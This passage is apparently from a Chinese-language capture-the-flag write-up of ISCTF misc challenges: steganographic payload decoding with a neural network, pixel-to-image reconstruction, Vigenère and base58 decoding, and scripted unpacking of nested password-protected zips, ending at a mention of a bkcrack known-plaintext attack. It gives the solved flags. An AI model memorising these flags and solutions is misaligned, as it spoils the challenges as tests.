class="number">2</span>]</span><br><span class="line">        x3 = x01[:, :, :, <span class="number">1</span>::<span class="number">2</span>]</span><br><span class="line">        x4 = x02[:, :, :, <span class="number">1</span>::<span class="number">2</span>]</span><br><span class="line">        x_LL = x1 + x2 + x3 + x4</span><br><span class="line">        x_HL = -x1 - x2 + x3 + x4</span><br><span class="line">        x_LH = -x1 + x2 - x3 + x4</span><br><span class="line">        x_HH = x1 - x2 - x3 + x4</span><br><span class="line">        <span class="keyword">return</span> torch.cat((x_LL, x_HL, x_LH, x_HH), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IWT</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(IWT, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.requires_grad = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        r = <span class="number">2</span></span><br><span class="line">        in_batch, in_channel, in_height, in_width = x.size()</span><br><span class="line">        out_batch, out_channel, out_height, out_width = in_batch, <span class="built_in">int</span>(</span><br><span class="line">            in_channel / (r ** <span class="number">2</span>)), r * in_height, r * in_width</span><br><span class="line">        x1 = x[:, <span class="number">0</span>:out_channel, :, :] / <span class="number">2</span></span><br><span class="line">        x2 = x[:, out_channel:out_channel * <span class="number">2</span>, :, :] / <span class="number">2</span></span><br><span class="line">        x3 = x[:, out_channel * <span class="number">2</span>:out_channel * <span class="number">3</span>, :, :] / <span class="number">2</span></span><br><span class="line">        x4 = x[:, out_channel * <span class="number">3</span>:out_channel * <span class="number">4</span>, :, :] / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        h = torch.zeros([out_batch, out_channel, out_height, out_width]).<span class="built_in">float</span>().to(x.device)</span><br><span class="line"></span><br><span class="line">        h[:, :, <span class="number">0</span>::<span class="number">2</span>, <span class="number">0</span>::<span class="number">2</span>] = x1 - x2 - x3 + x4</span><br><span class="line">        h[:, :, <span class="number">1</span>::<span class="number">2</span>, <span class="number">0</span>::<span class="number">2</span>] = x1 - x2 + x3 - x4</span><br><span class="line">        h[:, :, <span class="number">0</span>::<span class="number">2</span>, <span class="number">1</span>::<span class="number">2</span>] = x1 + x2 - x3 - x4</span><br><span class="line">        h[:, :, <span class="number">1</span>::<span class="number">2</span>, <span class="number">1</span>::<span class="number">2</span>] = x1 + x2 + x3 + x4</span><br><span class="line">        <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================= PART 3: Payload 解码与爆破 =================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_payload</span>(<span class="params">model, img_path</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[*] Decoding payload from <span class="subst">{img_path}</span>..."</span>)</span><br><span class="line">    device = torch.device(<span class="string">"cuda:0"</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">"cpu"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 读取和预处理</span></span><br><span class="line">    img = Image.<span class="built_in">open</span>(img_path).convert(<span class="string">'RGB'</span>)</span><br><span class="line">    img = img.resize((<span class="number">600</span>, <span class="number">450</span>)) </span><br><span class="line">    transform = T.Compose([T.ToTensor()])</span><br><span class="line">    steg_tensor = transform(img).unsqueeze(<span class="number">0</span>).to(device)</span><br><span class="line">    </span><br><span class="line">    dwt = DWT().to(device)</span><br><span class="line">    iwt = IWT().to(device)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 逆向推理</span></span><br><span class="line">    steg_dwt = dwt(steg_tensor)</span><br><span class="line">    z_tensor = torch.zeros_like(steg_dwt).to(device)</span><br><span class="line">    inp_rev = torch.cat((steg_dwt, z_tensor), dim=<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        out_rev = model.reverse(inp_rev)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取 payload 通道</span></span><br><span class="line">    payload_dwt = out_rev.narrow(<span class="number">1</span>, <span class="number">12</span>, <span class="number">12</span>)</span><br><span class="line">    payload_img_tensor = iwt(payload_dwt)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 转换为比特流</span></span><br><span class="line">    payload_flat = payload_img_tensor.view(-<span class="number">1</span>).cpu().numpy()</span><br><span class="line">    bits = (payload_flat &gt; <span class="number">0.5</span>).astype(<span class="built_in">int</span>).tolist()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[*] Extracted <span class="subst">{<span class="built_in">len</span>(bits)}</span> bits. Converting to bytearray..."</span>)</span><br><span class="line">    </span><br><span class="line">    byte_buffer = []</span><br><span class="line">    <span class="comment"># 仅处理前 2000 个字节足够了，因为 Flag 通常很短</span></span><br><span class="line">    limit_bytes = <span class="number">2000</span> </span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">min</span>(<span class="built_in">len</span>(bits) // <span class="number">8</span>, limit_bytes)):</span><br><span class="line">        byte_bits = bits[b * <span class="number">8</span>:(b + <span class="number">1</span>) * <span class="number">8</span>]</span><br><span class="line">        byte_val = <span class="built_in">int</span>(<span class="string">''</span>.join([<span class="built_in">str</span>(bit) <span class="keyword">for</span> bit <span class="keyword">in</span> byte_bits]), <span class="number">2</span>)</span><br><span class="line">        byte_buffer.append(byte_val)</span><br><span class="line">    </span><br><span class="line">    data = <span class="built_in">bytearray</span>(byte_buffer)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[*] Brute-forcing RS message length (assuming msg at start)..."</span>)</span><br><span class="line">    </span><br><span class="line">    rs = RSCodec(<span class="number">128</span>) <span class="comment"># nsym = 128</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 爆破长度：从 nsym + 1 开始尝试</span></span><br><span class="line">    <span class="comment"># 假设消息长度在 1 到 200 字节之间，所以总长度在 129 到 328 之间</span></span><br><span class="line">    found_flag = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">130</span>, <span class="number">500</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            candidate = data[:length]</span><br><span class="line">            <span class="comment"># 尝试 RS 解码</span></span><br><span class="line">            decoded = rs.decode(candidate)[<span class="number">0</span>]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 尝试 Zlib 解压</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                text = zlib.decompress(decoded)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"\n[SUCCESS] Found valid message at length <span class="subst">{length}</span>!"</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"Content: <span class="subst">{text}</span>"</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    flag_str = text.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f"Flag: <span class="subst">{flag_str}</span>"</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">"flag{"</span> <span class="keyword">in</span> flag_str:</span><br><span class="line">                        found_flag = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f"Raw decrypted: <span class="subst">{text}</span>"</span>)</span><br><span class="line">            <span class="keyword">except</span> zlib.error:</span><br><span class="line">                <span class="comment"># RS check passed but zlib failed</span></span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> (ReedSolomonError, ValueError):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[-] Brute-force finished without finding 'flag{'. Check the raw content above if any success."</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 1. 恢复图片</span></span><br><span class="line">    restored_img = reconstruct_image()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> restored_img:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 加载模型</span></span><br><span class="line">    device = torch.device(<span class="string">"cuda:0"</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">"cpu"</span>)</span><br><span class="line">    model = simple_net().to(device)</span><br><span class="line">    </span><br><span class="line">    possible_paths = [<span class="string">'steg/misuha.taki'</span>, <span class="string">'misuha.taki'</span>, <span class="string">'../misuha.taki'</span>]</span><br><span class="line">    model_path = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> possible_paths:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(p):</span><br><span class="line">            model_path = p</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">if</span> model_path:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[*] Loading model from <span class="subst">{model_path}</span>..."</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            state_dicts = torch.load(model_path, map_location=device)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'net'</span> <span class="keyword">in</span> state_dicts:</span><br><span class="line">                raw_state_dict = state_dicts[<span class="string">'net'</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                raw_state_dict = state_dicts</span><br><span class="line">            </span><br><span class="line">            new_state_dict = {}</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> raw_state_dict.items():</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'tmp_var'</span> <span class="keyword">in</span> k:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                new_key = k</span><br><span class="line">                <span class="keyword">if</span> new_key.startswith(<span class="string">'model.'</span>):</span><br><span class="line">                    new_key = new_key[<span class="number">6</span>:]</span><br><span class="line">                new_state_dict[new_key] = v</span><br><span class="line">                </span><br><span class="line">            model.load_state_dict(new_state_dict)</span><br><span class="line">            model.<span class="built_in">eval</span>()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"[+] Model loaded successfully."</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"[-] Error loading model: <span class="subst">{e}</span>"</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[-] Model file (misuha.taki) not found."</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 解码</span></span><br><span class="line">    decode_payload(model, restored_img)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>得到flag{Sh4r3_S3reCTTt_wiTh_Ai_H@@@@}，<strong>ISCTF{Sh4r3_S3reCTTt_wiTh_Ai_H@@@@}</strong></p>
<ul>
<li><p>爱玩游戏的小蓝鲨</p>
<blockquote>
<p>小蓝鲨说 它将永远追随刻律德菈</p>
<p>Hint:换行也应该带个下划线，刻律德拉是凯撒但这里不是凯撒。</p>
</blockquote>
</li>
</ul>
<p>很明显像素，还原成二维图像即可。</p>
<p>一共192318行，分解一下质因式即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取数据</span></span><br><span class="line">pixels = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'1.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        line = line.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 去除括号</span></span><br><span class="line">        line = line.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        parts = line.split(<span class="string">','</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) == <span class="number">3</span>:</span><br><span class="line">            r, g, b = <span class="built_in">map</span>(<span class="built_in">int</span>, parts)</span><br><span class="line">            pixels.append((r, g, b))</span><br><span class="line"></span><br><span class="line">N = <span class="built_in">len</span>(pixels)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"总像素数: <span class="subst">{N}</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 候选 (width, height)</span></span><br><span class="line">candidates = [(<span class="number">482</span>, <span class="number">399</span>), (<span class="number">399</span>, <span class="number">482</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> w, h <span class="keyword">in</span> candidates:</span><br><span class="line">    <span class="keyword">if</span> w * h != N:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"尺寸 <span class="subst">{w}</span>x<span class="subst">{h}</span> 不匹配总像素"</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"尝试尺寸: <span class="subst">{w}</span>x<span class="subst">{h}</span>"</span>)</span><br><span class="line">    img = Image.new(<span class="string">'RGB'</span>, (w, h))</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">            img.putpixel((x, y), pixels[idx])</span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">    img.save(<span class="string">f'flag_<span class="subst">{w}</span>x<span class="subst">{h}</span>.png'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"保存为 flag_<span class="subst">{w}</span>x<span class="subst">{h}</span>.png"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/images/flag_482x399.png" alt=""></p>
<p>一下子也不晓得是什么游戏的文字，交给Rycbartbad，找到了星穹铁道里面的翁法罗斯文字</p>
<p>手动翻译得到QKEMK{al4t_k4nT_auMm3_U0Kv_yzV94e3_kg_yp3_O0teI}</p>
<p>明显是Vigenere，密钥是ISCTF：ISCTF{st4r_r4iL_isTh3_M0St_fuN94m3_in_th3_W0rlD}</p>
<p>补一下漏掉的下划线<strong>ISCTF{st4r_r4iL_is_Th3_M0St_fuN_94m3_in_th3_W0rlD}</strong></p>
<ul>
<li><p>美丽的风景照</p>
<blockquote>
<p>做题做累了吧，来看看风景吧！</p>
<p>Hint1:按照彩虹颜色排序试试看</p>
<p>Hint2:这照片里的古建筑上怎么写个明光大正”“那是正大光明，古风都是倒着来的</p>
</blockquote>
</li>
</ul>
<p>附件:zip</p>
<p>简单file发现zip，直接改后缀解压，得到一张gif，字符串肉眼可见，随便找个网站extracted就行，随波逐流也可</p>
<p>轻松得到jqW2 ZXw8T 7HLo8 6yRWh Dg2C 98Mz 3CaEK</p>
<p>不像是base64，比较像base58，试了都失败了</p>
<p>Hint1给出后重排，可以得到jqW2Dg2C7HLo86yRWh3CaEKZXw8T98Mz，解码还是错误</p>
<p>Hint2给出以后实在是无语了，继续重排2WqjC2gD7HLo86yRWhKEaC3ZXw8T98Mz，注意别忘了青花瓷也是“古代”。</p>
<p>base58解码得到<strong>ISCTF{H0w_834u71fu1!!!}</strong></p>
<ul>
<li><p>小蓝鲨的千层FLAG</p>
<blockquote>
<p>“如果你愿一层一层一层地剥开我的 Zip 你会发现，你会流泪—— 埋在最深处 8+4 的真正奥秘……”</p>
<p>Hint:可参考资料：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/255145.html">https://www.freebuf.com/articles/network/255145.html</a></p>
</blockquote>
</li>
</ul>
<p>本来想抢血的，但无奈写脚本能力太差，花了很久时间</p>
<p>嵌套压缩包，HxD打开，文件末尾写了密码。试着手动解压一次，规律都一样，只是数字-1，那就循环解压缩了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">"flagggg"</span></span><br><span class="line">start_n = <span class="number">999</span></span><br><span class="line"></span><br><span class="line">password_pattern = re.<span class="built_in">compile</span>(<span class="string">rb"The password is ([\x21-\x7e]+)"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password_from_zip</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="string">"""从 ZIP 尾部附加数据解析密码"""</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    matches = <span class="built_in">list</span>(password_pattern.finditer(data))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> matches:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> matches[-<span class="number">1</span>].group(<span class="number">1</span>)  <span class="comment"># bytes</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_with_7z</span>(<span class="params">zip_path, out_path, password</span>):</span><br><span class="line"></span><br><span class="line">    cmd = [</span><br><span class="line">        <span class="string">"7z"</span>, <span class="string">"x"</span>, zip_path,</span><br><span class="line">        <span class="string">f"-p<span class="subst">{password.decode()}</span>"</span>,</span><br><span class="line">        <span class="string">f"-o."</span>,         <span class="comment"># 输出到当前目录</span></span><br><span class="line">        <span class="string">"-y"</span>            <span class="comment"># 自动覆盖</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[+] 调用: <span class="subst">{<span class="string">' '</span>.join(cmd)}</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 执行 7z</span></span><br><span class="line">    result = subprocess.run(cmd, capture_output=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查错误</span></span><br><span class="line">    <span class="keyword">if</span> result.returncode != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(result.stdout.decode(errors=<span class="string">'ignore'</span>))</span><br><span class="line">        <span class="built_in">print</span>(result.stderr.decode(errors=<span class="string">'ignore'</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(out_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 若内部文件不是预期名字，尝试找刚解出的文件</span></span><br><span class="line">    files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(<span class="string">"."</span>) <span class="keyword">if</span> f.endswith(<span class="string">".zip"</span>)]</span><br><span class="line">    <span class="keyword">if</span> files:</span><br><span class="line">        os.rename(files[<span class="number">0</span>], out_path)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(start_n, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        in_file = <span class="string">f"<span class="subst">{prefix}</span><span class="subst">{n:03d}</span>.zip"</span></span><br><span class="line">        out_file = <span class="string">f"<span class="subst">{prefix}</span><span class="subst">{(n-<span class="number">1</span>):03d}</span>.zip"</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"\n=== 处理 <span class="subst">{in_file}</span> ==="</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(in_file):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"[!] 文件不存在：<span class="subst">{in_file}</span>"</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        pwd = get_password_from_zip(in_file)</span><br><span class="line">        <span class="keyword">if</span> pwd <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"[!] 找不到密码！"</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[+] 提取到密码: <span class="subst">{pwd.decode(errors=<span class="string">'ignore'</span>)}</span>"</span>)</span><br><span class="line"></span><br><span class="line">        ok = extract_with_7z(in_file, out_file, pwd)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ok:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"[!] 7z 解压失败"</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[+] 输出: <span class="subst">{out_file}</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>得到了flagggg000.zip，然后又是flagggg99.zip，手动解压出flagggg99.zip，脚本基本上同上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">current_file = <span class="string">"flagggg99.zip"</span></span><br><span class="line"></span><br><span class="line">pwd_re = re.<span class="built_in">compile</span>(<span class="string">rb"The password is ([0-9A-Fa-f]+)"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析文件名中的数字</span></span><br><span class="line">name_re = re.<span class="built_in">compile</span>(<span class="string">r"flagggg(\d+)\.zip"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[+] 当前 ZIP: <span class="subst">{current_file}</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读密码</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(current_file, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    m = pwd_re.search(data)</span><br><span class="line"></span><br><span class="line">    password = m.group(<span class="number">1</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[+] 解析到密码:"</span>, password)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解压</span></span><br><span class="line">    cmd = [<span class="string">"7z"</span>, <span class="string">"x"</span>, <span class="string">f"-p<span class="subst">{password}</span>"</span>, current_file, <span class="string">"-y"</span>]</span><br><span class="line">    proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> proc.returncode != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[!] 解压失败！"</span>)</span><br><span class="line">        <span class="built_in">print</span>(proc.stdout)</span><br><span class="line">        <span class="built_in">print</span>(proc.stderr)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 匹配文件名</span></span><br><span class="line">    m2 = name_re.fullmatch(current_file)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> m2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[!] 文件名不符合 flagggg&lt;数字&gt;.zip 格式"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    num = <span class="built_in">int</span>(m2.group(<span class="number">1</span>))</span><br><span class="line">    next_num = num - <span class="number">1</span></span><br><span class="line">    <span class="comment"># 下一层文件名（自动匹配数字长度）</span></span><br><span class="line">    next_file = <span class="string">f"flagggg<span class="subst">{next_num}</span>.zip"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(next_file):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[+] 未找到下一层："</span>, next_file)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[+] 可能已经全部解完！"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[+] 解压得到下一层:"</span>, next_file)</span><br><span class="line">    current_file = next_file</span><br></pre></td></tr></table></figure>
<p>解压到flagggg3.zip，出题人开始玩心眼子了:The password is… wait, I forgot! But you must know what’s inside, right?</p>
<p>查看Hint，提示已知明文攻击。bkcrack</p>
<p>这一块我还没完全掌握，没有成功。交给了Rycbartbad解出，复现后的正确命令行如下：</p>
